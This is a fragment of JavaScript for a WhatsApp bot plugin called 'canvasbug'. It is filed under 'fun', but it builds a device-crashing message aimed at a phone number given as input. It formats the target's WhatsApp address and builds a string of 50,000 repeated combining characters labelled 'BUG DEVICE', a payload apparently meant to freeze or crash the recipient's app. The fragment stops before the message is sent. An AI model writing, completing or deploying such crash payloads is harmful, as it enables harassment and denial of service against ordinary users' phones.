...
cmd({
  ...
  category: "fun",
  desc: "Canvas Bug Function by Cyber Anuwh",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Reply to a user or provide a number!* (ex: .canvasbug 947xxxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  let uitext = "𝐁𝐔𝐆 𝐃𝐄𝐕𝐈𝐂𝐄 𝐔𝐒𝐈𝐍𝐆 𝐀𝐍𝐔𝐖𝐇 𝐌𝐃 𝐅𝐑𝐄𝐄 𝐁𝐎𝐓 " + "꧀".repeat(50000);
